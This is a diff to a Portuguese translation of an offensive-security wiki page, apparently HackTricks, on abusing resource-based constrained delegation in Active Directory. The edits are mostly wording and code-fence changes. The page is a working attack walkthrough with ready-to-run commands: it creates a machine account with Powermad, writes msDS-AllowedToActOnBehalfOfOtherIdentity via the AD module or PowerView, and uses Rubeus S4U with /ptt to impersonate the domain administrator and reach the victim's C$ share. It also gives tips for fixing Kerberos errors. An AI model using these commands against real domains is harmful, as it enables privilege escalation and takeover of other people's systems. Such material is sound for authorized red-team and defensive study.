@@ -5,18 +5,18 @@
 
 ## Noções Básicas da Delegação Constrangida Baseada em Recurso
 
-Isso é semelhante à [Delegação Constrangida](constrained-delegation.md) básica, mas **em vez** de dar permissões a um **objeto** para **impersonar qualquer usuário contra um serviço**. A Delegação Constrangida Baseada em Recurso **define** no **objeto quem pode impersonar qualquer usuário contra ele**.
+Isso é semelhante à [Delegação Constrangida](constrained-delegation.md) básica, mas **em vez** de dar permissões a um **objeto** para **impersonar qualquer usuário contra uma máquina**. A Delegação Constrangida Baseada em Recurso **define** no **objeto quem pode impersonar qualquer usuário contra ele**.
 
 Neste caso, o objeto constrangido terá um atributo chamado _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ com o nome do usuário que pode impersonar qualquer outro usuário contra ele.
 
-Outra diferença importante desta Delegação Constrangida em relação às outras delegações é que qualquer usuário com **permissões de escrita sobre uma conta de máquina** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) pode definir o _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (Nas outras formas de Delegação, você precisava de privilégios de administrador de domínio).
+Outra diferença importante desta Delegação Constrangida em relação às outras delegações é que qualquer usuário com **permissões de escrita sobre uma conta de máquina** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) pode definir o **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (Nas outras formas de Delegação, você precisava de privilégios de administrador de domínio).
 
 ### Novos Conceitos
 
 Na Delegação Constrangida, foi dito que a **`TrustedToAuthForDelegation`** flag dentro do valor _userAccountControl_ do usuário é necessária para realizar um **S4U2Self.** Mas isso não é completamente verdade.\
 A realidade é que mesmo sem esse valor, você pode realizar um **S4U2Self** contra qualquer usuário se você for um **serviço** (tiver um SPN), mas, se você **tiver `TrustedToAuthForDelegation`** o TGS retornado será **Forwardable** e se você **não tiver** essa flag, o TGS retornado **não será** **Forwardable**.
 
-No entanto, se o **TGS** usado em **S4U2Proxy** **NÃO for Forwardable**, tentar abusar de uma **delegação constrangida básica** **não funcionará**. Mas se você estiver tentando explorar uma **delegação constrangida baseada em recurso, funcionará** (isso não é uma vulnerabilidade, é um recurso, aparentemente).
+No entanto, se o **TGS** usado em **S4U2Proxy** **NÃO for Forwardable**, tentar abusar de uma **delegação constrangida básica** **não funcionará**. Mas se você estiver tentando explorar uma **delegação constrangida baseada em recurso, funcionará**.
 
 ### Estrutura do Ataque
 
@@ -24,7 +24,7 @@ No entanto, se o **TGS** usado em **S4U2Proxy** **NÃO for Forwardable**, tentar
 
 Suponha que o atacante já tenha **privilégios equivalentes de escrita sobre o computador da vítima**.
 
-1. O atacante **compromete** uma conta que tem um **SPN** ou **cria um** (“Serviço A”). Note que **qualquer** _Usuário Admin_ sem nenhum outro privilégio especial pode **criar** até 10 **objetos de Computador (**_**MachineAccountQuota**_**)** e definir um **SPN** para eles. Assim, o atacante pode simplesmente criar um objeto de Computador e definir um SPN.
+1. O atacante **compromete** uma conta que tem um **SPN** ou **cria um** (“Serviço A”). Note que **qualquer** _Usuário Admin_ sem nenhum outro privilégio especial pode **criar** até 10 objetos de Computador (**_MachineAccountQuota_**) e definir um **SPN** para eles. Assim, o atacante pode apenas criar um objeto de Computador e definir um SPN.
 2. O atacante **abusa de seu privilégio de ESCRITA** sobre o computador da vítima (Serviço B) para configurar **delegação constrangida baseada em recurso para permitir que o Serviço A impersonifique qualquer usuário** contra aquele computador da vítima (Serviço B).
 3. O atacante usa Rubeus para realizar um **ataque S4U completo** (S4U2Self e S4U2Proxy) do Serviço A para o Serviço B para um usuário **com acesso privilegiado ao Serviço B**.
 1. S4U2Self (da conta SPN comprometida/criada): Solicitar um **TGS de Administrador para mim** (Não Forwardable).
@@ -33,15 +33,15 @@ Suponha que o atacante já tenha **privilégios equivalentes de escrita sobre o 
 4. O atacante pode **passar o ticket** e **impersonar** o usuário para ganhar **acesso ao Serviço B da vítima**.
 
 Para verificar o _**MachineAccountQuota**_ do domínio, você pode usar:
-```powershell
+```bash
 Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
 ```
 ## Ataque
 
 ### Criando um Objeto de Computador
 
-Você pode criar um objeto de computador dentro do domínio usando [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
-```powershell
+Você pode criar um objeto de computador dentro do domínio usando **[powermad](https://github.com/Kevin-Robertson/Powermad):**
+```bash
 import-module powermad
 New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 
@@ -51,12 +51,12 @@ Get-DomainComputer SERVICEA
 ### Configurando Delegação Constrangida Baseada em Recurso
 
 **Usando o módulo PowerShell do activedirectory**
-```powershell
+```bash
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
 ```
 **Usando powerview**
-```powershell
+```bash
 $ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
 $SDBytes = New-Object byte[] ($SD.BinaryLength)
@@ -72,7 +72,7 @@ msds-allowedtoactonbehalfofotheridentity
 ```
 ### Realizando um ataque S4U completo
 
-Primeiramente, criamos o novo objeto Computador com a senha `123456`, então precisamos do hash dessa senha:
+Primeiro de tudo, criamos o novo objeto Computador com a senha `123456`, então precisamos do hash dessa senha:
 ```bash
 .\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
 ```
@@ -81,7 +81,7 @@ Agora, o ataque pode ser realizado:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
 ```
-Você pode gerar mais tickets apenas pedindo uma vez usando o parâmetro `/altservice` do Rubeus:
+Você pode gerar mais tickets para mais serviços apenas pedindo uma vez usando o parâmetro `/altservice` do Rubeus:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
@@ -97,7 +97,7 @@ ls \\victim.domain.local\C$
 ```
 ### Abuse diferentes tickets de serviço
 
-Saiba mais sobre os [**tickets de serviço disponíveis aqui**](silver-ticket.md#available-services).
+Saiba sobre os [**tickets de serviço disponíveis aqui**](silver-ticket.md#available-services).
 
 ## Erros do Kerberos
 
@@ -106,8 +106,8 @@ Saiba mais sobre os [**tickets de serviço disponíveis aqui**](silver-ticket.md
 - **`preauth_failed`**: Isso significa que o nome de usuário + hashes fornecidos não estão funcionando para login. Você pode ter esquecido de colocar o "$" dentro do nome de usuário ao gerar os hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
 - **`KDC_ERR_BADOPTION`**: Isso pode significar:
   - O usuário que você está tentando impersonar não pode acessar o serviço desejado (porque você não pode impersoná-lo ou porque ele não tem privilégios suficientes)
-  - O serviço solicitado não existe (se você pedir um ticket para winrm, mas o winrm não estiver em execução)
-  - O fakecomputer criado perdeu seus privilégios sobre o servidor vulnerável e você precisa recuperá-los.
+  - O serviço solicitado não existe (se você pedir um ticket para winrm, mas o winrm não está em execução)
+  - O fakecomputer criado perdeu seus privilégios sobre o servidor vulnerável e você precisa devolvê-los.
 
 ## Referências
 
@@ -115,5 +115,7 @@ Saiba mais sobre os [**tickets de serviço disponíveis aqui**](silver-ticket.md
 - [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
 - [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
 - [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
+- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
+
 
 {{#include ../../banners/hacktricks-training.md}}
